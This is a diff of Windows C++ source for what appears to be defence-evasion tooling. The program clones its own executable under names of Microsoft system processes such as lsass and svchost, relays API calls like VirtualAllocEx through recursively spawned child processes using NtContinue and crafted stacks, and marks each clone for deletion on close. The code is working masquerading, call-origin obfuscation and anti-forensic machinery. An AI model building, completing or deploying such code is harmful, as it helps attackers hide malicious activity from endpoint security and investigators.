@@ -1,14 +1,12 @@
-// Keep these includes and DEBUG macros
 #include <windows.h>
 #include <iostream>
 #include <vector>
 #include <string>
 #include <cstdio>
-#include <random>   // For GenerateRandomBinaryName
-#include <sstream>  // For GenerateRandomBinaryName
-#include <memory>   // For std::unique_ptr in old ProcessChildMode (can be removed if not used)
+#include <random>   
+#include <sstream>  
+#include <memory>   
 
-// Define a preprocessor macro for debug prints
 #ifdef _DEBUG
 #define DEBUG_PRINTF(...) printf(__VA_ARGS__)
 #define DEBUG_COUT(x) std::cout << x
@@ -17,7 +15,6 @@
 #define DEBUG_COUT(x) do {} while (0)
 #endif
 
-// NTSTATUS and NtContinue_t from previous NtContinue version
 #ifndef NTSTATUS
 typedef LONG NTSTATUS;
 #endif
@@ -26,9 +23,6 @@ typedef LONG NTSTATUS;
 #endif
 typedef NTSTATUS(NTAPI* NtContinue_t)(PCONTEXT ContextRecord, BOOLEAN TestAlert);
 
-// Your GenerateRandomBinaryName, ResolveFunction, CreateIPCPipe, CreateCloneExecutable
-// (These seem okay for now, assuming they work as intended)
-// ... (paste your existing implementations of these helper functions here) ...
 const std::vector<std::string> MS_BINARY_NAMES = {
     "svchost", "wininit", "csrss", "lsass", "winlogon", "spoolsv", "dwm",
     "explorer", "taskmgr", "msiexec", "conhost", "rundll32", "services",
@@ -99,28 +93,16 @@ std::string CreateCloneExecutable() {
         std::cerr << "CreateCloneExecutable: Failed to copy file to " << newPath << " Error: " << GetLastError() << std::endl;
         return ""; // Return empty on failure
     }
+
+    // Set temporary attribute in case cleaup fails
+    if (!SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_TEMPORARY)) {
+        DEBUG_PRINTF("CreateCloneExecutable: Warning - Failed to set TEMPORARY attribute on %s. Error: %lu\n",
+            newPath.c_str(), GetLastError());
+    }
     return newPath;
 }
 
 extern "C" void CaptureRAX_And_CallHelper();  // Assembly stub
-
-__declspec(noinline) // Good practice for function pointers
-void terminator() {
-    DEBUG_COUT("terminator: Process is exiting. Attempting to call TerminateProcess." << std::endl);
-    // GetCurrentProcess() returns a pseudo-handle (-1) which is fine for TerminateProcess on self.
-    // Exit code 0 indicates success.
-    BOOL result = TerminateProcess(GetCurrentProcess(), 0);
-    if (!result) {
-        // This is unlikely to be reached or be useful if TerminateProcess itself fails critically,
-        // but good for completeness.
-        DEBUG_PRINTF("terminator: TerminateProcess failed! Error: %lu\n", GetLastError());
-    }
-    // TerminateProcess should not return if it succeeds in initiating termination.
-    // If it does, something is very wrong.
-    DEBUG_COUT("terminator: TerminateProcess returned, which is unexpected." << std::endl);
-    // Fallback to a hard exit if TerminateProcess somehow "returns"
-    ExitProcess(1); // Exit with an error code
-}
 
 // Data to be sent back over the pipe from the C++ helper
 struct ApiCallResultResponse {
@@ -134,12 +116,11 @@ HANDLE g_hPipeForChildResponse = INVALID_HANDLE_VALUE;
 extern "C" __declspec(noinline) void NTAPI ProcessResultAndExit(DWORD64 raxFromApi) {
     DEBUG_PRINTF("ProcessResultAndExit: Captured RAX from target API = 0x%llX\n", raxFromApi);
 
-    // Here you could add logic to check raxFromApi and call GetLastError()
-    // For example:
+
     DWORD lastError = 0;
     bool apiCallSuccess = true; // Assume success initially
 
-    // Example check for typical failure returns (adjust based on actual API)
+	// Debug some failures. Should be removed later when the actual response is sent back to the parent.
     if (raxFromApi == 0 || raxFromApi == (DWORD64)INVALID_HANDLE_VALUE) {
         apiCallSuccess = false;
         lastError = GetLastError(); // Get error code if API indicated failure
@@ -148,11 +129,6 @@ extern "C" __declspec(noinline) void NTAPI ProcessResultAndExit(DWORD64 raxFromA
     else {
         DEBUG_COUT("ProcessResultAndExit: Target API call appears to have succeeded." << std::endl);
     }
-
-    // TODO: Send 'apiCallSuccess', 'raxFromApi', 'lastError' back to parent via pipe.
-    // This part requires passing the pipe handle and WriteFile FARPROC to this C++ helper,
-    // which means the assembly stub needs to pass more arguments (e.g., via StubWorkerContext).
-    // For now, we just print and exit.
     
 	std::string pipeName = "RecursiveDelegationPipe_" + std::to_string(GetCurrentProcessId()) + "_0"; // Level 0 pipe name
 	
@@ -166,7 +142,6 @@ extern "C" __declspec(noinline) void NTAPI ProcessResultAndExit(DWORD64 raxFromA
     DWORD bytesWritten;
     if (!WriteFile(g_hPipeForChildResponse, &result, sizeof(BOOL), &bytesWritten, NULL) || bytesWritten != sizeof(BOOL)) {
         std::cerr << "Child: Failed to write result to pipe. Error: " << GetLastError() << std::endl;
-        // Continue to close pipe
     }
     DEBUG_COUT("Child: Sent result to parent." << std::endl);
 	Sleep(10000); // Give time for parent to read before closing
@@ -175,8 +150,6 @@ extern "C" __declspec(noinline) void NTAPI ProcessResultAndExit(DWORD64 raxFromA
     ExitProcess(apiCallSuccess ? 0 : 2); // Fallback if TerminateProcess somehow returns/fails
 }
 
-// Our robust PrepareStackForApiCall (from previous correct version)
-// ... (paste the full PrepareStackForApiCall function here) ...
 void* PrepareStackForApiCall(
     const std::vector<DWORD64>& stackArgs_in_order,
     FARPROC pRetAddressForApi,
@@ -259,7 +232,6 @@ void* PrepareStackForApiCall(
 }
 
 
-// New structure for passing API call parameters
 struct ApiCallParams {
     char funcNameWithModule[256]; // e.g., "Kernel32!VirtualAllocEx"
     DWORD64 rcx_val;
@@ -362,7 +334,6 @@ bool ExecuteApiCallAtLevelZero(
     return NT_SUCCESS(status);
 }
 
-// Modified RecursiveDelegate
 bool RecursiveDelegate(
     int level,
     const ApiCallParams* pCallParams,
@@ -415,6 +386,30 @@ bool RecursiveDelegate(
     }
     DEBUG_COUT("RecursiveDelegate: Child process created. PID: " << pi.dwProcessId << std::endl);
 
+
+    // Mark the clone for deletion once all handles to it are closed.
+    // The child process will have a handle to its own executable image while it's running.
+    HANDLE hCloneFileForDelete = CreateFileA(
+        clonePath.c_str(),
+        DELETE,                          // Request delete access
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, // Allow child to run
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_DELETE_ON_CLOSE,       // Mark for deletion
+        NULL
+    );
+
+    if (hCloneFileForDelete == INVALID_HANDLE_VALUE) {
+        std::cerr << "RecursiveDelegate: Warning - Failed to open clone " << clonePath
+            << " with FILE_FLAG_DELETE_ON_CLOSE. Error: " << GetLastError()
+            << ". Manual deletion might be required." << std::endl;
+            // Continue without this auto-delete feature, manual DeleteFileA will still try
+    }
+    else {
+        DEBUG_COUT("RecursiveDelegate: Clone " << clonePath << " marked with FILE_FLAG_DELETE_ON_CLOSE." << std::endl);
+        CloseHandle(hCloneFileForDelete); // Close our handle; system now manages deletion.
+    }
+
     DEBUG_COUT("RecursiveDelegate: Waiting for pipe client to connect..." << std::endl);
     if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
         std::cerr << "RecursiveDelegate: Failed to connect to client on pipe. Error: " << GetLastError() << std::endl;
@@ -431,7 +426,6 @@ bool RecursiveDelegate(
     // Send ApiCallParams (fixed size structure)
     if (!WriteFile(hPipe, pCallParams, sizeof(ApiCallParams), &bytesWritten, NULL) || bytesWritten != sizeof(ApiCallParams)) {
         std::cerr << "RecursiveDelegate: Failed to write ApiCallParams to pipe. Error: " << GetLastError() << std::endl;
-        // ... (cleanup) ...
         return false;
     }
     DEBUG_COUT("RecursiveDelegate: Sent ApiCallParams." << std::endl);
@@ -441,7 +435,6 @@ bool RecursiveDelegate(
     SIZE_T numStackArgs = pStackArgs->size();
     if (!WriteFile(hPipe, &numStackArgs, sizeof(SIZE_T), &bytesWritten, NULL) || bytesWritten != sizeof(SIZE_T)) {
         std::cerr << "RecursiveDelegate: Failed to write numStackArgs to pipe. Error: " << GetLastError() << std::endl;
-        // ... (cleanup) ...
         return false;
     }
     DEBUG_COUT("RecursiveDelegate: Sent numStackArgs: " << numStackArgs << std::endl);
@@ -452,7 +445,6 @@ bool RecursiveDelegate(
         SIZE_T stackArgsDataSize = numStackArgs * sizeof(DWORD64);
         if (!WriteFile(hPipe, pStackArgs->data(), stackArgsDataSize, &bytesWritten, NULL) || bytesWritten != stackArgsDataSize) {
             std::cerr << "RecursiveDelegate: Failed to write stackArgs data to pipe. Error: " << GetLastError() << std::endl;
-            // ... (cleanup below needs to be robust) ...
             TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hPipe); DeleteFileA(clonePath.c_str());
             return false;
         }
@@ -592,7 +584,7 @@ int main(int argc, char* argv[]) {
     // RCX = hProcess, RDX = lpAddress, R8 = dwSize, R9 = flAllocationType
     // Stack Arg 5 = flProtect
 
- // --- Test 2: VirtualAllocEx using an INHERITED OpenProcess handle ---
+    // --- Test 2: VirtualAllocEx using an INHERITED OpenProcess handle ---
     std::cout << "\n--- TESTING VirtualAllocEx (Self, Inherited OpenProcess Handle) ---" << std::endl;
     HANDLE hSelfProcessInheritable = NULL;
     SECURITY_ATTRIBUTES sa_inherit;
